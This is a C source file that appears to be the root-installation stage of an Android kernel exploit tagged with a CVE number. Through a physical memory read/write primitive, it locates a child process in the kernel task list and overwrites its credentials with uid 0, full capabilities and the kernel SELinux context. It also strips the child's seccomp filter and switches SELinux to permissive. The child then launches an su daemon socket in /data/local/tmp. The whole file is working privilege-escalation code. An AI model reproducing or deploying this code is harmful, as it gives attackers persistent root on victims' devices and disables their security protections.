#include "common.h"
#include "payload.h"

#include <stdlib.h>
#include <sys/un.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

int payload_default_attempts(void) {
#ifdef PAYLOAD_ATTEMPT_BUDGET
  return PAYLOAD_ATTEMPT_BUDGET;
#elif defined(APP_PAYLOAD) && APP_PAYLOAD
  return 24;
#else
  return 16;
#endif
}

int payload_attempt_timeout_sec(void) {
#ifdef PAYLOAD_ATTEMPT_TIMEOUT_SEC
  return PAYLOAD_ATTEMPT_TIMEOUT_SEC;
#else
  return 90;
#endif
}

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"
#define CAP_FULL 0x000001ffffffffffULL

struct root_shared {
  atomic_int go;
  atomic_int child_failed;
  int child_errno;
  int setgid_ret;
  int setuid_ret;
};

static struct root_shared *root_shared;
static pid_t root_child_pid = -1;
static int root_ready_pipe[2] = {-1, -1};

static uint64_t root_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, target, &value, sizeof(value));
  return value;
}

static uint32_t root_read32(int fd, uintptr_t target) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, target, &value, sizeof(value));
  return value;
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return pipe_phys_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return pipe_phys_write_data(fd, target, &value, sizeof(value));
}

static int root_is_kernel_ptr(uint64_t value) {
  return (value >> 48) == 0xffff;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}
#endif

static const char *root_helper_path(void) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *path = getenv("CVE43499_ROOT_HELPER");
  return path && path[0] == '/' ? path : NULL;
#else
  return ROOT_UMH_PATH;
#endif
}

/* Fork before walking init_task: the new child is then normally init's last
 * task-list entry, and the fallback walk still verifies its tgid. The child
 * waits without changing credentials until the parent has patched its own
 * task_struct and cred through pipe physrw. */
static int spawn_root_child(const char *helper, uid_t allowed_uid) {
  root_shared = mmap(NULL, sizeof(*root_shared), PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (root_shared == MAP_FAILED) {
    root_shared = NULL;
    return 0;
  }
  memset(root_shared, 0, sizeof(*root_shared));
  if (pipe(root_ready_pipe) != 0) {
    return 0;
  }

  root_child_pid = fork();
  if (root_child_pid < 0) {
    return 0;
  }
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);
    prctl(PR_SET_NAME, "rmn-root-child");
    char ready = 'R';
    if (write(root_ready_pipe[1], &ready, sizeof(ready)) !=
        (ssize_t)sizeof(ready)) {
      _exit(120);
    }
    close(root_ready_pipe[1]);

    for (int i = 0; i < 60000 && !atomic_load(&root_shared->go); i++) {
      usleep(1000);
    }
    if (!atomic_load(&root_shared->go)) {
      _exit(121);
    }

    errno = 0;
    root_shared->setgid_ret = setresgid(0, 0, 0);
    if (root_shared->setgid_ret != 0) {
      root_shared->child_errno = errno;
      atomic_store(&root_shared->child_failed, 1);
      _exit(122);
    }
    errno = 0;
    root_shared->setuid_ret = setresuid(0, 0, 0);
    if (root_shared->setuid_ret != 0 || getuid() != 0 || geteuid() != 0 ||
        getgid() != 0 || getegid() != 0) {
      root_shared->child_errno = errno ? errno : EPERM;
      atomic_store(&root_shared->child_failed, 1);
      _exit(123);
    }

    char uid_text[16];
    snprintf(uid_text, sizeof(uid_text), "%u", allowed_uid);
    char *argv[] = {(char *)helper, "--umh", uid_text, NULL};
    execv(helper, argv);
    root_shared->child_errno = errno;
    atomic_store(&root_shared->child_failed, 1);
    _exit(124);
  }

  close(root_ready_pipe[1]);
  root_ready_pipe[1] = -1;
  char ready = 0;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  close(root_ready_pipe[0]);
  root_ready_pipe[0] = -1;
  return got == (ssize_t)sizeof(ready) && ready == 'R';
}

static void stop_root_child(void) {
  if (root_child_pid > 0) {
    kill(root_child_pid, SIGKILL);
    while (waitpid(root_child_pid, NULL, 0) < 0 && errno == EINTR) {
    }
    root_child_pid = -1;
  }
}

static uintptr_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uintptr_t image_head = data_addr(INIT_TASK) + TASK_TASKS_OFF;
  uintptr_t canonical_head = canon_addr(INIT_TASK) + TASK_TASKS_OFF;
  uint64_t entry = root_read64(fd, image_head);

  for (int i = 0; i < 4096; i++) {
    if (entry == image_head || entry == canonical_head) {
      break;
    }
    if (!is_direct_ptr(entry) || entry < TASK_TASKS_OFF) {
      break;
    }
    uintptr_t task = entry - TASK_TASKS_OFF;
    uint32_t pid = root_read32(fd, task + TASK_PID_OFF);
    uint32_t tgid = root_read32(fd, task + TASK_TGID_OFF);
    if (pid == want_tgid || tgid == want_tgid) {
      return task;
    }
    entry = root_read64(fd, task + TASK_TASKS_OFF);
  }
  return 0;
}

int cleanup_main_waiter_pi_state(int fd) {
  int tid = atomic_load(&waiter_tid);
  uint32_t tgid = (uint32_t)getpid();
  if (tid <= 0 || (uint32_t)tid == tgid ||
      atomic_load(&consumer_inflight)) {
    pr_warning("root waiter cleanup precondition tgid=%u tid=%d inflight=%d\n",
               tgid, tid, atomic_load(&consumer_inflight));
    return 0;
  }

  uintptr_t leader = find_task_by_tgid(fd, tgid);
  if (!is_direct_ptr(leader) ||
      root_read32(fd, leader + TASK_PID_OFF) != tgid ||
      root_read32(fd, leader + TASK_TGID_OFF) != tgid) {
    pr_warning("root waiter cleanup leader lookup failed tgid=%u task=%016zx\n",
               tgid, leader);
    return 0;
  }

  uintptr_t head = leader + TASK_THREAD_GROUP_OFF;
  uint64_t entry = root_read64(fd, head);
  uintptr_t waiter_task = 0;
  for (int i = 0; i < 256 && entry != head; i++) {
    if (!is_direct_ptr(entry) || entry < TASK_THREAD_GROUP_OFF) {
      return 0;
    }
    uintptr_t task = entry - TASK_THREAD_GROUP_OFF;
    if (root_read32(fd, task + TASK_PID_OFF) == (uint32_t)tid &&
        root_read32(fd, task + TASK_TGID_OFF) == tgid) {
      waiter_task = task;
      break;
    }
    entry = root_read64(fd, task + TASK_THREAD_GROUP_OFF);
  }
  if (!is_direct_ptr(waiter_task)) {
    pr_warning("root waiter cleanup thread lookup failed tgid=%u tid=%d\n",
               tgid, tid);
    return 0;
  }

  uintptr_t node = waiter_task + TASK_THREAD_GROUP_OFF;
  uint64_t next = root_read64(fd, node);
  uint64_t prev = root_read64(fd, node + sizeof(uint64_t));
  if (!is_direct_ptr(next) || !is_direct_ptr(prev) ||
      root_read64(fd, next + sizeof(uint64_t)) != node ||
      root_read64(fd, prev) != node) {
    pr_warning("root waiter cleanup thread list validation failed "
               "task=%016zx next=%016llx prev=%016llx\n",
               waiter_task, (unsigned long long)next,
               (unsigned long long)prev);
    return 0;
  }

  uint32_t pi_lock = root_read32(fd, waiter_task + TASK_PI_LOCK_OFF);
  uint64_t pi_root = root_read64(fd, waiter_task + TASK_PI_WAITERS_OFF);
  uint64_t pi_left = root_read64(
      fd, waiter_task + TASK_PI_WAITERS_OFF + sizeof(uint64_t));
  uint64_t pi_top = root_read64(fd, waiter_task + TASK_PI_TOP_TASK_OFF);
  uintptr_t blocked_addr = waiter_task + TASK_PI_BLOCKED_ON_OFF;
  uint64_t before = root_read64(fd, blocked_addr);
  if (pi_lock || pi_root || pi_left || pi_top ||
      !root_is_kernel_ptr(before) || (before & 7) ||
      root_read64(fd, blocked_addr) != before ||
      root_read64(fd, blocked_addr) != before) {
    pr_warning("root waiter cleanup unsafe state task=%016zx lock=%08x "
               "waiters=%016llx/%016llx top=%016llx blocked=%016llx\n",
               waiter_task, pi_lock, (unsigned long long)pi_root,
               (unsigned long long)pi_left, (unsigned long long)pi_top,
               (unsigned long long)before);
    return 0;
  }

  int wrote = root_write64(fd, blocked_addr, 0);
  uint64_t after = root_read64(fd, blocked_addr);
  int ok = wrote && after == 0 && root_read64(fd, blocked_addr) == 0 &&
           root_read64(fd, blocked_addr) == 0;
  pr_info("root waiter cleanup leader=%016zx task=%016zx tgid=%u tid=%d "
          "lock=%08x waiters=%016llx/%016llx top=%016llx "
          "blocked_on=%016llx->%016llx write=%d ok=%d\n",
          leader, waiter_task, tgid, tid, pi_lock,
          (unsigned long long)pi_root, (unsigned long long)pi_left,
          (unsigned long long)pi_top, (unsigned long long)before,
          (unsigned long long)after, wrote, ok);
  if (ok) {
    atomic_store(&waiter_tid, 0);
    atomic_store(&pi_cleanup_done, 1);
  }
  return ok;
}

static int patch_task_seccomp(int fd, uintptr_t task) {
  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;
  uint64_t flags_before = root_read64(fd, flags_addr);
  uint64_t atomic_before = root_read64(fd, atomic_addr);
  uint32_t mode_before = root_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
      root_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = root_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_after = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_after = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  int ok = root_write64(fd, flags_addr, flags_after) &&
           root_write64(fd, atomic_addr, atomic_after) &&
           root_write32(fd, seccomp_addr + SECCOMP_MODE_OFF, 0) &&
           root_write32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, 0) &&
           root_write64(fd, seccomp_addr + SECCOMP_FILTER_OFF, 0);
  uint64_t flags_check = root_read64(fd, flags_addr);
  uint64_t atomic_check = root_read64(fd, atomic_addr);
  uint32_t mode_check = root_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_check =
      root_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_check = root_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);
  pr_info("root seccomp task=%016zx ok=%d flags=%016llx/%016llx "
          "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
          "filter=%016llx/%016llx\n",
          task, ok, (unsigned long long)flags_before,
          (unsigned long long)flags_check, (unsigned long long)atomic_before,
          (unsigned long long)atomic_check, mode_before, mode_check,
          count_before, count_check, (unsigned long long)filter_before,
          (unsigned long long)filter_check);
  return ok && (flags_check & (1ULL << TIF_SECCOMP_BIT)) == 0 &&
         (atomic_check & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0 &&
         mode_check == 0 && count_check == 0 && filter_check == 0;
}

static int patch_cred(int fd, uintptr_t cred, uint32_t selinux_blob_off) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

  uint32_t ids[8] = {0};
  uint32_t securebits = 0;
  uint64_t caps[CRED_CAP_WORDS] = {
      CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, ids, sizeof(ids)) ||
      !pipe_phys_write_data(fd, cred + CRED_SECUREBITS_OFF, &securebits,
                            sizeof(securebits)) ||
      !pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
    return 0;
  }

  uintptr_t security = root_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    return 0;
  }
  uint32_t sid_pair[2] = {SELINUX_KERNEL_SID, SELINUX_KERNEL_SID};
  uintptr_t sid_addr = security + selinux_blob_off + SELINUX_CRED_OSID_OFF;
  if (!pipe_phys_write_data(fd, sid_addr, sid_pair, sizeof(sid_pair))) {
    return 0;
  }

  uint32_t uid_after = root_read32(fd, cred + CRED_UID_OFF);
  uint64_t effective_after =
      root_read64(fd, cred + CRED_CAPS_OFF + 2 * sizeof(uint64_t));
  uint32_t osid_after = root_read32(fd, sid_addr);
  uint32_t sid_after = root_read32(fd, sid_addr + SELINUX_CRED_SID_OFF);
  pr_info("root cred=%016zx security=%016zx uid=%u cap_eff=%016llx "
          "sid=%u/%u blob=%#x\n",
          cred, security, uid_after, (unsigned long long)effective_after,
          osid_after, sid_after, selinux_blob_off);
  return uid_after == 0 && effective_after == CAP_FULL &&
         osid_after == SELINUX_KERNEL_SID && sid_after == SELINUX_KERNEL_SID;
}

static int install_direct_cred_root(int fd) {
  const char *helper = root_helper_path();
  if (!helper) {
    pr_error("root missing CVE43499_ROOT_HELPER\n");
    return 0;
  }

  uid_t allowed_uid = getuid();
  unlink(ROOT_SOCKET_PATH);
  if (!spawn_root_child(helper, allowed_uid)) {
    pr_error("root child spawn failed errno=%d\n", errno);
    stop_root_child();
    return 0;
  }

  uintptr_t init_tasks = data_addr(INIT_TASK) + TASK_TASKS_OFF;
  uint64_t last_entry = root_read64(fd, init_tasks + sizeof(uint64_t));
  uintptr_t task = 0;
  if (is_direct_ptr(last_entry) && last_entry >= TASK_TASKS_OFF) {
    uintptr_t candidate = last_entry - TASK_TASKS_OFF;
    if (root_read32(fd, candidate + TASK_TGID_OFF) ==
        (uint32_t)root_child_pid) {
      task = candidate;
    }
  }
  if (!task) {
    task = find_task_by_tgid(fd, (uint32_t)root_child_pid);
  }
  if (!is_direct_ptr(task)) {
    pr_error("root task lookup failed child=%d last=%016llx\n",
             root_child_pid, (unsigned long long)last_entry);
    stop_root_child();
    return 0;
  }

  char comm[TASK_COMM_LEN + 1];
  memset(comm, 0, sizeof(comm));
  pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);
  uint32_t pid = root_read32(fd, task + TASK_PID_OFF);
  uint32_t tgid = root_read32(fd, task + TASK_TGID_OFF);
  uintptr_t real_cred = root_read64(fd, task + TASK_REAL_CRED_OFF);
  uintptr_t cred = root_read64(fd, task + TASK_CRED_OFF);
  uint32_t selinux_blob_off = root_read32(fd, data_addr(SELINUX_BLOB_SIZES));
  pr_info("root task=%016zx pid=%u tgid=%u comm=%s cred=%016zx/%016zx "
          "selinux_blob=%#x\n",
          task, pid, tgid, comm, cred, real_cred, selinux_blob_off);
  if (pid != (uint32_t)root_child_pid ||
      tgid != (uint32_t)root_child_pid || !is_direct_ptr(cred) ||
      !is_direct_ptr(real_cred) || selinux_blob_off > 0x1000) {
    stop_root_child();
    return 0;
  }

  if (getenv("CVE43499_ROOT_DIAG_READONLY")) {
    uintptr_t security = root_read64(fd, cred + CRED_SECURITY_OFF);
    uint32_t uid = root_read32(fd, cred + CRED_UID_OFF);
    uint64_t cap_effective =
        root_read64(fd, cred + CRED_CAPS_OFF + 2 * sizeof(uint64_t));
    uint32_t sid = 0xffffffff;
    if (is_direct_ptr(security)) {
      sid = root_read32(fd, security + selinux_blob_off +
                            SELINUX_CRED_SID_OFF);
    }
    uint64_t thread_flags =
        root_read64(fd, task + TASK_THREAD_INFO_FLAGS_OFF);
    uint64_t atomic_flags = root_read64(fd, task + TASK_ATOMIC_FLAGS_OFF);
    uint32_t seccomp_mode =
        root_read32(fd, task + TASK_SECCOMP_OFF + SECCOMP_MODE_OFF);
    uint32_t seccomp_count = root_read32(
        fd, task + TASK_SECCOMP_OFF + SECCOMP_FILTER_COUNT_OFF);
    uint64_t seccomp_filter = root_read64(
        fd, task + TASK_SECCOMP_OFF + SECCOMP_FILTER_OFF);
    pr_info("root readonly security=%016zx uid=%u cap_eff=%016llx sid=%u "
            "flags=%016llx atomic=%016llx seccomp=%u/%u/%016llx\n",
            security, uid, (unsigned long long)cap_effective, sid,
            (unsigned long long)thread_flags,
            (unsigned long long)atomic_flags, seccomp_mode, seccomp_count,
            (unsigned long long)seccomp_filter);
    stop_root_child();
    return 0;
  }

  int seccomp_ok = patch_task_seccomp(fd, task);
  int cred_ok = patch_cred(fd, cred, selinux_blob_off);
  int real_cred_ok = cred == real_cred ||
      patch_cred(fd, real_cred, selinux_blob_off);
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t enforcing_before = 0xff;
  uint8_t permissive = 0;
  uint8_t enforcing_after = 0xff;
  pipe_phys_read_data(fd, selinux_addr, &enforcing_before,
                      sizeof(enforcing_before));
  int selinux_ok = pipe_phys_write_data(
      fd, selinux_addr, &permissive, sizeof(permissive));
  pipe_phys_read_data(fd, selinux_addr, &enforcing_after,
                      sizeof(enforcing_after));
  pr_info("root patch seccomp=%d cred=%d/%d selinux=%d %u->%u\n",
          seccomp_ok, cred_ok, real_cred_ok, selinux_ok, enforcing_before,
          enforcing_after);
  if (!seccomp_ok || !cred_ok || !real_cred_ok || !selinux_ok ||
      enforcing_after != 0) {
    stop_root_child();
    return 0;
  }

  atomic_store(&root_shared->go, 1);
  int socket_ok = 0;
  for (int i = 0; i < 500; i++) {
    if (root_socket_ready()) {
      socket_ok = 1;
      break;
    }
    if (atomic_load(&root_shared->child_failed)) {
      break;
    }
    usleep(10000);
  }
  pr_info("root child result pid=%d socket=%d failed=%d errno=%d "
          "setgid=%d setuid=%d\n",
          root_child_pid, socket_ok, atomic_load(&root_shared->child_failed),
          root_shared->child_errno, root_shared->setgid_ret,
          root_shared->setuid_ret);
  if (!socket_ok) {
    if (enforcing_before <= 1) {
      pipe_phys_write_data(fd, selinux_addr, &enforcing_before,
                           sizeof(enforcing_before));
    }
    stop_root_child();
    return 0;
  }

  root_child_done = 1;
  root_uid_after = 0;
  return 1;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root direct-cred start uid=%u fd=%d\n", root_uid_before, fd);
  int installed = install_direct_cred_root(fd);

/* The holder is the P0 oracle route's own arrangement: pipe.c hands its three
 * retained descriptors to the resident daemon and then binds this abstract
 * ready socket. Wait only in an app build that actually created that route. */
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (installed) {
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      payload_report_root(0, 0, "p0 holder timeout");
      return 0;
    }
  }
#endif

  payload_report_root(root_child_done,
                      root_child_done && root_uid_after == 0,
                      installed ? "su daemon serving" :
                                  "direct cred route failed");
  return installed;
}
